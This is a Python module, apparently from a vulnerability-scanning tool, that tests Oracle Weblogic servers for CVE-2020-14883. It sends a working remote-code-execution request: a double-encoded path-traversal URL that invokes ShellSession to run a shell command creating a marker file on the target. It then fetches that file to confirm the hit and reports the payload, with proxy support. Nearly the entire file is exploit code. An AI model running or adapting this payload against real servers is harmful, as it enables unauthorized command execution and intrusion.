import requests
import re
from bs4 import BeautifulSoup
import logging

uia=''
http = ''
https = ''
def dl2011(dl):
    global http,https
    http=dl
    https=dl
def ty1(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        logging.captureWarnings(True)
        requests.get(url+'console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/xbhia.txt%27);%22)',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        g2 = requests.get(url+'console/framework/skins/wlsconsole/css/xbhia.txt',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if g2.status_code==200 and len(str(g2.text))<50:
            uia = '[+]漏洞存在\n\n' \
                  '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27touch%20../../../wlserver/server/lib/consoleapp/webapp/framework/skins/wlsconsole/css/test.txt%27);%22)' \
                  '\n\nconsole/framework/skins/wlsconsole/css/xbhia.txt'
        else:
            uia = '[-]漏洞不存在'
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt11():
    global uia
    return '--------------------------------------------------\n[ Weblogic(CVE_2020_14883) ]\n\n'+ str (uia)+'\n'
def yt1a2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty1(url1,s_cookie)
    elif pd=='1':
        ty1(url1,s_cookie)